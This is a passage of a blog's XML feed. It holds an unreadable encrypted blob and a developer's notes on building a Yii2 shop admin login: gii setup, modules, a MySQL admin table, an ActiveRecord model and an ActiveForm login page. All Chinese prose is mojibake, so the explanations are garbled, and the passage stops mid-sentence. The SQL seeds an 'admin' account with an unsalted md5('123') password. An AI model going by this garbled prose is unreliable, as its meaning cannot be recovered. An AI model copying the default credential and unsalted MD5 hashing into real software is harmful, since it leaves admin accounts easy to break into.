LSmtkAv/10tNCSPW5InNs5Xs4MczMNeMh2CUUU5ouXYTbMq+GwJ2TJNyLo8203jehgurhKLV15tBtaF7YyMWzUmMdialu5a8PhrQYqO9rcso892Nm/Bgq5agCeMed2ohy1NXqqSWBKwbCvdjraJEL470XRqCENKVCL5Qxc3Es+MCq8PBMXMhwzPoYoIuhu+0HZTjBqQ7WlqNPKdikF9uZ6GGNhXBL0njin+d9/uVlPsw5fYVGCRAR9/g5283wwUbzvJ8kzyCSgxSVrxlyPj/eZ+Q3xzORuzRcwd6KthMKIZVhUM8hG/R+mQzr8Px3VDlq7FdXdtqTJfXfl+/GCBShoQUoJoNGk7/4+SkicF9PQddHjBOH8XrgAePu+wQWPWXNS78xKfOCngB+vp5eZztStPB76kTu2o28am6V5otyCd83JqIVqrKNE96f84nL3TNB1A/74PpO8hxlxtrMoVtdwtUEDjAL79x2LgyzDMVRA6uAvv/3xQuPrfwFAmV0t2OksKJocl1MZd1fRj4CPkZIQm8hZZ4D0C+TMOs6g7S7yffiPS++DU07DHSPKlyP+a+q2diqpv0qaBuxekDPL4hduBf9o97+ia5lK1cIa5Cvzpfef4Ruly2vRCfXeIiujCXuA4eWZTKWSDrLl2dcgUytSTqFWQcvWwhbkR2EfV5+0ndJiVQKS1Ob7stNE1gGvYARzoOJaELt6EbZwIqK6kYaysOUGFuxPNXKXlxuVESurRwmCSSy1I/R7aThGVz31o+lzorNMM4OXFn2VndyfaCimkONBPlZ+pJiGUbw/1NFCUrmDZZV+gO7x3ACT1a5Lh4X2eBHlrQu43EwAM2lf+S+MWqhE5p/pLLqkJ0xieiWAYFTOYa1aqProQNxRGFHHLRal7xZPTO6/JMEG5ihDkZUGUVt3ABlL45HasQUbTtcjwEjKlEazqXbYmlf/D/EB9g5Q2CgavKgd64lHnVg4xfeWDbK3oZQM3FcLPLYmn2pZwBAKSo9vrtxuRXxD9a5RAjT2kvjeCdUwln9slW31Xw+5kMNAHasF8U53KjCuTmXK33knv0tB3Zji2dLw6hWyaHFUIaBf3mvUvF4T2Mrcc1Cd55WArHn8zxJ3AIYhd5DokXgeorOqVm6G1zD0YOojL4RVh9Wr5MnSw8J4mC15+2kvwG3NXOOjzJkcMT2/qhedtYtgAnjxGWLil5BucwMM5KZ47ZkEUOUrQ9f7EmZXJKkZpD27n5BiMxc3X/tJwLmfUrM1U34yiGyytYK7QSkPcJHrHooTPvWMFOFDxJoz+BH4pPo69rfc1GJreuUKkeLUJWtCDZAvsOBuZ790ezB4HUTOEfxCxUxKMOI9cl3xMpxqLFJRBnlOR8rxbAUfFlfWJDqM/zpNye1p6TLrJguoik9rg7dQlBDtBKb+iEJOYho59KNhGVKn8P15wvxm4E5k/gNk3P7gW+wkEERfUiTVE+uj4ehfy/oJtihoYE1a8quh7UkMpkDVhWC4Jrc9ri1Oug0I5buOJumJaLx01gAKhgLk0VVyNQvJg9vX7Fy7nbEHy10CdtU51HuMJYfnGt/ESg6+LPw1xET9baKw7tdtFeKlHK1WHUDlfmlTZpYjoTBzvOImjFBITila+umujC1PHkjEnIp6VfKjtb/TOApDdz0KRjTlE25EJGcNvExhaAvA8Mjy8cLJf8GL0ih5j8WoFj98kdhXSzJFFElwCZ67usBO2KVM3VJFnMqMySikBdoXw6mdiCWYU812I7+XHOZvFI6GWSaoWV7iMZAQihethDa/MqfFC8TWA3kJKpDycK3+MxDiv0VI+3PRiLuRi24s6G8D3hQe+hnTW2f4p7rqPFxnAYTk0Q/CODVzDMHqf/63chBxwW81t0pisgeYFKO8bhnQ/UF848mmtcpTX40/EkGJiDIT3C25zcD8lZDqVl24/rLeoSA70bGDjBPRiZCDEbLFvnc+XNMVRaMahK7DKhRjTuu0ThKnwAndItVPCfDATE6T/M9iIau7iHsb2cktORNL5II+rMDu/2GLrAhXZT/F2Dd84hkGzSTNeg3G+K5/Fe94YiNn8+o6q3rxPyt0sTMkA5Y6zs0UOrJu3AXljaeqRUWwPr5qd+CdAp3P5sNeK420aCTJG/HDT7fWemeSJHD65Y7BZNIccqjbsE1BAKiF/vnD2ipYtG2xDW4CxSR9udSlTwp8/JgI5AHlgoT8qkonqwDr2UNbp5h6+dkfJhSzAKbksJQKtO6kxcYkf/sdAmxvTgXwD1GGxPd4n/6hFEUIOPR3g9VEOMOxUMaB4fWk5J+B1O2ynk0uzHWpw9Sk+OS7Q4RJwI/QcsDlqXJOoA0iCCFidveMMuTJ8E7Wa7g06mi3BlOF7Zb4cPEUcN5War+aUDJF1sezcILkNJhqdKLzX2xOLYHqaM1fXvgypjGoLCSwwI6cUFAHevx8wDrwYtw= </div>]]></content>
      
      <categories>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšç¬” </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ç¼–å†™Yiiæ¡†æ¶é¡¹ç›®æ—¶å‡ºç°çš„é—®é¢˜</title>
      <link href="/Yii-probleam.html"/>
      <url>/Yii-probleam.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è®°å½•ä¸€ä¸‹ç¼–å†™Yiiæ¡†æ¶ä¸­é¡¹ç›®çš„é—®é¢˜ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯è¾¹å­¦ä¹ è¾¹è®°å½•ï¼Œæœ‰ç‚¹ä¹±ï¼Œä½†æ˜¯è‡ªå·±çœ‹å¾—æ‡‚å°±å¥½</p><a id="more"></a><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><h3 id="webåº”ç”¨æ ¹ç›®å½•ä¸‹"><a href="#webåº”ç”¨æ ¹ç›®å½•ä¸‹" class="headerlink" title="webåº”ç”¨æ ¹ç›®å½•ä¸‹"></a>webåº”ç”¨æ ¹ç›®å½•ä¸‹</h3><p>   <code>asset</code>åŒ…å«yiiå‘å¸ƒçš„å„ç§èµ„æºæ–‡ä»¶åŒ…æ‹¬jså’Œcss</p><p>å¤šç”¨å…¬å…±æ¨¡æ¿æ–‡ä»¶å»åŠ è½½ï¼Œä¸å¤šè¿‡å¤šå»å†—ä½™ï¼Œæ³¨æ„åœ¨<code>views</code>æ–‡ä»¶å¤¹ä¸‹åˆ›å»ºè·Ÿ<code>controller</code>ä¸€æ ·åå­—çš„è§†å›¾æ–‡ä»¶å¤¹</p><p>æ³¨æ„åœ¨æŸäº›èµ„æºæ–‡ä»¶è°ƒè¿›assetæ–‡ä»¶å¤¹çš„æ—¶å€™éœ€è¦ä¿®æ”¹è·¯å¾„ï¼Œä¸€èˆ¬éƒ½æ˜¯è¦æœç´¢åƒ<code>img script css</code>ä¹‹ç±»çš„å…³é”®å­—</p><h3 id="å¤ä¹ ä¸€ä¸‹å¾ªç¯å°†æ‰€æœ‰å†…å®¹è¾“å‡ºçš„æ ¼å¼"><a href="#å¤ä¹ ä¸€ä¸‹å¾ªç¯å°†æ‰€æœ‰å†…å®¹è¾“å‡ºçš„æ ¼å¼" class="headerlink" title="å¤ä¹ ä¸€ä¸‹å¾ªç¯å°†æ‰€æœ‰å†…å®¹è¾“å‡ºçš„æ ¼å¼"></a>å¤ä¹ ä¸€ä¸‹å¾ªç¯å°†æ‰€æœ‰å†…å®¹è¾“å‡ºçš„æ ¼å¼</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">foreach</span>($a <span class="keyword">as</span> $b): <span class="meta">?&gt;</span></span><br><span class="line">&lt;td&gt; </span><br><span class="line"> <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $b;<span class="meta">?&gt;</span> </span><br><span class="line">&lt;/td&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">     <span class="comment">//æŠŠå„éƒ¨åˆ†å…ƒç´ è¾“å‡ºå°±å¥½ï¼Œè¿™é‡Œä¸ä¸€å®šå•å•å°±æ˜¯$b,ä¹Ÿå¯èƒ½æ˜¯$b-&gt;æŸä¸ªå…ƒç´ </span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endforeach</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨æ–°å»ºmodulesæ—¶å€™æˆ‘ä»¬éœ€è¦<code>giiè„šæ‰‹æ¶</code>çš„å¸®åŠ©ï¼Œè¿™ä¸ªé€‰é¡¹åœ¨<code>web.php</code>é‡Œé¢ï¼Œä¸€èˆ¬é»˜è®¤å¼€å¯ï¼Œéœ€è¦å¯¹ä»–æœ‰æƒé™å°±éœ€è¦åŠ ä¸Šä½ çš„ipï¼Œæ·»åŠ ä¸€ä¸ª<code>allowedIPs</code>é€‰é¡¹ï¼Œå¦‚ä¸‹å›¾<br><img src="https://s1.ax1x.com/2018/06/06/CHkkad.png" alt="CHkkad.png"><br><img src="https://s1.ax1x.com/2018/06/06/CHkAIA.png" alt="CHkAIA.png"><br><img src="https://s1.ax1x.com/2018/06/06/CHkVPI.png" alt="CHkVPI.png"></p><h3 id="æ–°å»ºçš„modules"><a href="#æ–°å»ºçš„modules" class="headerlink" title="æ–°å»ºçš„modules"></a>æ–°å»ºçš„modules</h3><p>è¿™ç›¸å½“äºä¸€ä¸ªå°å‹çš„Yiiæ¡†æ¶æˆ‘æ„Ÿè§‰ã€‚ã€‚ã€‚ã€‚é‡Œé¢ä¹Ÿæœ‰ä¸€ä¸ªå°å‹çš„mvc<br>ç„¶åæˆ‘ä»¬è¿˜éœ€è¦åœ¨<code>web.php</code>åŠ ä¸Šç›¸åº”çš„<code>modules</code>æ¨¡å—<br><img src="https://s1.ax1x.com/2018/06/06/CHkKsS.png" alt="CHkKsS.png"><br>ä»–å¥½åƒé»˜è®¤è°ƒç”¨çš„å¸ƒå±€æ–‡ä»¶å¥½åƒæ˜¯viewé‡Œé¢çš„<code>layouts/main.php</code><br>è‡ªå·±è°ƒä¸€ä¸‹å°±å¥½äº†</p><p>å¦å¤–å¡«å†™å‘½åç©ºé—´çš„æ—¶å€™è¿˜éœ€è¦æ”¹ä¸€ä¸‹<code>namespace app\modules\controllers;</code>ç›¸å½“äºå¢åŠ äº†<code>modules</code></p><p>Yii2ä¸‹çš„æ–‡ä»¶ä¸€èˆ¬éƒ½æ˜¯æ¡†æ¶é‡è¦çš„é…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨é‡Œé¢çš„<code>web/application</code> æ‰¾åˆ°<code>public defaultRoute</code>æ˜¯æŒ‡å®šé»˜è®¤çš„ä¸»é¡µè·¯å¾„çš„ï¼Œä¸€èˆ¬æœ€åå¼€å‘çš„æ—¶å€™ä¼šæŠŠåŸæ¥çš„å¸ƒå±€ç»™åˆ æ‰ï¼Œæ‰€ä»¥è¿™ä¸ªå‚æ•°ä¸€èˆ¬è¦æ”¹ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸ä¼šé€‰æ‹©ç›´æ¥æ”¹ï¼Œæ”¹äº†Yiiæ¡†æ¶æºç æœ€åæ£€é”™çš„æ—¶å€™ä¼šæœ‰ç‚¹è‰°éš¾ï¼Œè€Œæ˜¯åœ¨<code>web.php</code>è¿™ä¸ªé…ç½®æ–‡ä»¶ä¸­ä¿®æ”¹ï¼Œç›´æ¥æ·»åŠ å¯¹åº”çš„å‚æ•°åå­—å°±å¥½ï¼Œå¦‚ä¸‹å›¾<br><img src="https://s1.ax1x.com/2018/06/06/CHkuM8.png" alt="CHkuM8.png"></p><h3 id="åˆ›å»ºSQLæ–‡ä»¶"><a href="#åˆ›å»ºSQLæ–‡ä»¶" class="headerlink" title="åˆ›å»ºSQLæ–‡ä»¶"></a>åˆ›å»ºSQLæ–‡ä»¶</h3><p>è¿™é‡Œçš„commentåé¢çš„å†…å®¹æ˜¯è¯´æ˜ï¼Œè¿™é‡Œè¿˜å­¦åˆ°ä¸€ç§ä½¿ç”¨æ•°æ®åº“çš„æ–°æ¨¡å¼ï¼ŒUNIQUEçº¦æŸï¼Œè¿™ä¸ªä¸œè¥¿ç›¸å½“äºè®¾å®šä¸€ä¸ªå¯¹åº”çš„SETæŸ¥è¯¢ï¼Œæˆ‘çŒœä¸­é—´é‚£é‡Œåº”è¯¥æ˜¯<code>SQLçº¦æŸ</code>çš„åå­—</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span><span class="string">`shop_admin`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span><span class="string">`shop_admin`</span>(</span><br><span class="line"><span class="string">`adminid`</span><span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENTCOMMENT<span class="string">'ä¸»é”®ID'</span>,</span><br><span class="line"><span class="string">`adminuser`</span><span class="built_in">VARCHAR</span>(<span class="number">32</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span><span class="string">'ç®¡ç†å‘˜å¸å·'</span>,</span><br><span class="line"><span class="string">`adminpass`</span><span class="built_in">CHAR</span>(<span class="number">32</span>)<span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span><span class="string">'ç®¡ç†å‘˜å¯†ç '</span>,</span><br><span class="line"><span class="string">`adminemail`</span><span class="built_in">VARCHAR</span>(<span class="number">50</span>)<span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span><span class="string">'ç®¡ç†å‘˜é‚®ç®±'</span>,</span><br><span class="line"><span class="string">`logintime`</span><span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span><span class="string">'ç™»å½•æ—¶é—´'</span>,</span><br><span class="line"><span class="string">`loginip`</span> <span class="built_in">BIGINT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span><span class="string">'ç™»å½•IP'</span>,</span><br><span class="line"><span class="string">`createtime`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span><span class="string">'åˆ›å»ºæ—¶é—´'</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span>(<span class="string">`adminid`</span>),</span><br><span class="line"><span class="keyword">UNIQUE</span> shop_admin_adminuser_adminpass(<span class="string">`adminuser`</span>,<span class="string">`adminpass`</span>),</span><br><span class="line"><span class="keyword">UNIQUE</span> shop_admin_adminuser_adminemail(<span class="string">`adminuser`</span>,<span class="string">`adminemail`</span>)</span><br><span class="line">)<span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span><span class="string">`shop_admin`</span>(adminuser,adminpass,adminemail,createtime)<span class="keyword">VALUES</span>(<span class="string">'admin'</span>,<span class="keyword">md5</span>(<span class="string">'123'</span>),<span class="string">'test@163.com'</span>,<span class="keyword">UNIX_TIMESTAMP</span>());</span><br></pre></td></tr></table></figure><p>ç„¶åå¯¼è¿›æ•°æ®åº“æ–‡ä»¶<br>æ³¨æ„å­—èŠ‚çš„æ•°æ®åº“æ–‡ä»¶åçš„åˆ—åæ˜¯å¦ä¸€è‡´ï¼Œæˆ‘ä»–ä¹ˆæ‰¾äº†å¾ˆä¹…æ‰æ‰¾åˆ°è‡ªå·±å“ªé‡Œé”™äº†</p><p>åœ¨åå°åˆ›å»ºmodelsæ¨¡å—ï¼Œä¸€èˆ¬ä¸è¦é€‰æ‹©ç›´æ¥åœ¨å¤§æ¡†æ¶ä¸‹çš„modelsæ–‡ä»¶å¤¹åˆ›å»ºï¼Œå› ä¸ºæˆ‘ä»¬å¾—å°†åå¤©è·Ÿå‰å°åˆ†ç¦»å¼€ï¼Œåˆ«è®©å®ƒä»¬äº’ç›¸å½±å“ã€‚ã€‚</p><p>ä¸€èˆ¬æƒ…å†µä¸‹åˆ›å»ºçš„æ•°æ®åº“çš„ç±»åè·Ÿè¡¨åä¸€è‡´</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">modules</span>\<span class="title">models</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">ActiveRecord</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">ActiveRecord</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">tableName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&#123;&#123;%admin&#125;&#125;"</span>;     <span class="comment">//è¿™é‡Œä¸ç”¨shop_å‰ç¼€æ˜¯å› ä¸ºæˆ‘ä»¬åœ¨é…ç½®æ•°æ®åº“æ–‡ä»¶å·²æŠŠå‰ç¼€ç»™è®¾å®šå¥½ï¼Œå¯ä»¥ç”¨å·¦é¢çš„æ–¹å¼å»å†™</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå†åœ¨å¯¹åº”çš„ç™»å½•é¡µé¢å»æŠŠå¯¹åº”çš„ç±»ç»™è°ƒç”¨ï¼Œå¹¶ä¸”åˆ›å»ºï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">namespace</span>  <span class="title">app</span>\<span class="title">modules</span>\<span class="title">controllers</span>;</span><br><span class="line">   <span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span><br><span class="line">   <span class="keyword">use</span> <span class="title">app</span>\<span class="title">modules</span>\<span class="title">models</span>\<span class="title">Admin</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">PublicController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionLogin</span><span class="params">()</span></span></span><br><span class="line"><span class="function">       </span>&#123;</span><br><span class="line">           <span class="keyword">$this</span> -&gt;layout = <span class="keyword">false</span>;</span><br><span class="line">           $models = <span class="keyword">new</span> Admin;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">"login"</span>,[<span class="string">'models'</span>=&gt;$models]); <span class="comment">//ä¸€å®šè¦æ³¨æ„è¿”å›ï¼Œç»å¸¸å¿˜è®°</span></span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå»åˆ°åå°ç™»å½•é¡µé¢çš„HTMLä»£ç ï¼Œé¦–è¡ŒåŠ è½½</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">use</span> <span class="title">yii</span>\<span class="title">bootstrap</span>\<span class="title">ActiveForm</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç±»æœ‰å¸®åŠ©åˆ›å»º<code>formç»„ä»¶</code><br>ç„¶ååœ¨å¯¹åº”éƒ¨åˆ†æ·»åŠ ç›¸åº”çš„ä»£ç </p><h3 id="è¡¨å•æ“ä½œå¯¹åº”æ–‡ç« "><a href="#è¡¨å•æ“ä½œå¯¹åº”æ–‡ç« " class="headerlink" title="è¡¨å•æ“ä½œå¯¹åº”æ–‡ç« "></a>è¡¨å•æ“ä½œå¯¹åº”æ–‡ç« </h3><p><a href="http://www.jb51.net/article/77754.htm" target="_blank" rel="noopener">http://www.jb51.net/article/77754.htm</a></p><p>ç„¶åæˆ‘ä»¬æŠŠå¯¹åº”çš„é™æ€çš„inputæ ‡ç­¾ç»™åˆ é™¤æ‰ï¼Œè¿˜æœ‰å¯¹åº”çš„è¯´æ˜ä¹Ÿç»™åˆ æ‰,ä¸‹é¢å†è®²<br>æ³¨æ„ä»–ä»¬å¯¹åº”çš„ç±»å‹å»ä¿®æ”¹ï¼Œè¿™é‡Œæ˜¯å› ä¸º<code>â€™è®°ä½æˆ‘â€˜</code>çš„é‚£ä¸€ä¸ªé€‰é¡¹å¼•å‡ºæ¥çš„ç‚¹ï¼Œå› ä¸ºä»–çš„ç±»å‹æ˜¯CheckBoxï¼Œå¹¶ä¸”ä¸€èˆ¬æ¥è¯´fieldå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ä¸€èˆ¬æ˜¯é»˜è®¤ä»¥æ•°æ®åº“é‡Œé¢çš„å­—æ®µå»è®¾ç½®çš„ï¼Œæ‰€ä»¥ä¸å­˜åœ¨è®°ä½æˆ‘çš„è¿™ä¸€ä¸ªé€‰é¡¹ï¼Œæˆ‘ä»¬è¿˜éœ€è¦åœ¨modelsé‡Œé¢æ·»åŠ ä¸€ä¸ªå‚æ•°<code>rememberMe</code>è®¾å®šä¸ºtrueå°±æ˜¯é»˜è®¤å‹¾é€‰çš„ã€‚ã€‚ã€‚ä½†æ˜¯è¿™ä¸ª<code>CheckBox</code>çš„å¤æ‚æ€§ï¼Œè¿˜å­˜åœ¨divå±æ€§ï¼Œäºæ˜¯æˆ‘ä»¬æ—¢å¯ä»¥åˆ©ç”¨yiiæ¡†æ¶æä¾›ç»™æˆ‘ä»¬çš„templateå»å®Œæˆï¼Œæ‰€ä»¥å•ç‹¬æœ‰inputå±æ€§å°±æ¯”è¾ƒç®€å•ç‚¹ï¼Œç›´æ¥å°±æ˜¯åœ¨æŸåœ¨ç±»å‹çš„æ ‡ç­¾é‡Œå†™ä¸Šå¯¹åº”çš„ä¸œè¥¿å³å¯</p><p>åœ¨æäº¤æŒ‰é’®ä¸‹ï¼Œè¿™é‡Œå°±ä¸é€‚ç”¨fieldå‡½æ•°äº†ï¼Œç”¨å¦å¤–çš„æ–¹æ³•å®ç°ï¼Œç”¨çš„æ˜¯Htmlçš„ç±»ï¼Œå…¶å®å†™æ³•ä¹Ÿå·®ä¸å¤š</p><p>é¦–å…ˆæˆ‘ä»¬å¾—åœ¨å‰é¢æ·»åŠ ç›¸åº”çš„æ¨¡å—ï¼Œè¿™é‡Œä¸€å®šè¦è®°å¾—ï¼Œæˆ‘è¿™é‡Œå¿˜äº†è°ƒäº†å¾ˆä¹…<br> <code>use yii\Helpers\Html;</code><br> å¯¹æ¯”ä¸€ä¸‹å°±çŸ¥é“æ€ä¹ˆå†™äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> Html::submitButton(<span class="string">"ç™»å½•"</span>,[<span class="string">"class"</span>=&gt;<span class="string">"btn-glowprimarylogin"</span>,]);<span class="meta">?&gt;</span></span><br><span class="line">&lt;aclass=<span class="string">"btn-glowprimarylogin"</span>href=<span class="string">"index.html"</span>&gt;ç™»å½•&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>åˆ°æœ€åè¿˜å¾—æŠŠåˆšæ‰å¤šå‡ºæ¥çš„æ ‡ç­¾ç»™å¼„æ‰ï¼Œä½†æ˜¯æˆ‘ä»¬æ¯ä¸ªåŒºæ·»åŠ templateå°±ä¼šå¾ˆçƒ¦ï¼Œæ‰€ä»¥<br>æˆ‘ä»¬ç›´æ¥åœ¨beginé‚£éƒ¨åˆ†å®ç°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$form=ActiveForm::begin([</span><br><span class="line"><span class="string">'fieldConfig'</span>=&gt;[</span><br><span class="line"><span class="string">'template'</span>=&gt;<span class="string">'&#123;input&#125;'</span></span><br><span class="line">]</span><br><span class="line">]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆæ•ˆæœ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $form=ActiveForm::begin([</span><br><span class="line"><span class="string">'fieldConfig'</span>=&gt;[</span><br><span class="line"><span class="string">'template'</span>=&gt;<span class="string">'&#123;input&#125;'</span></span><br><span class="line">]</span><br><span class="line">]);<span class="meta">?&gt;</span></span><br><span class="line">&lt;div class="span4box"&gt;</span><br><span class="line">&lt;div class="content-wrap"&gt;</span><br><span class="line">&lt;h6&gt;äºŒæ‰‹å•†åŸ-åå°ç®¡ç†&lt;/h6&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $form-&gt;field($models,<span class="string">'adminuser'</span>)-&gt;textInput([<span class="string">"class"</span>=&gt;<span class="string">"span12"</span>,<span class="string">"placeholder"</span>=&gt;<span class="string">"ç®¡ç†å‘˜å¸å·"</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $form-&gt;field($models,<span class="string">'adminpass'</span>)-&gt;passwordInput([<span class="string">"class"</span>=&gt;<span class="string">"span12"</span>,<span class="string">"placeholder"</span>=&gt;<span class="string">'ç®¡ç†å‘˜å¯†ç '</span>]);<span class="meta">?&gt;</span></span><br><span class="line">&lt;a href="#"class="forgot"&gt;å¿˜è®°å¯†ç ?&lt;/a&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $form-&gt;field($models,<span class="string">'rememberMe'</span>)-&gt;checkbox([</span><br><span class="line"><span class="string">"id"</span>=&gt;<span class="string">"remember-me"</span>,</span><br><span class="line"><span class="string">"template"</span>=&gt;<span class="string">"&lt;div class=\"remember\"&gt;&#123;input&#125;&lt;labelfor=\"remember-me\"&gt;è®°ä½æˆ‘&lt;/label&gt;&lt;/div&gt;"</span>,</span><br><span class="line">]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> Html::submitButton(<span class="string">'ç™»å½•'</span>,[<span class="string">"class"</span>=&gt;<span class="string">"btn-glowprimarylogin"</span>,]);<span class="meta">?&gt;</span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> ActiveForm::end();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç®¡ç†åå°ä¸éœ€è¦æ³¨å†Œï¼Œè®°å¾—è¦åˆ é™¤ï¼Œå¦åˆ™å‡ºå•¥é—®é¢˜åæœè‡ªè´Ÿäº†ï¼Œhiahia<br>æ³¨æ„è¿™é‡Œçš„<code>models</code>è¦å¯¹åº”ä½ 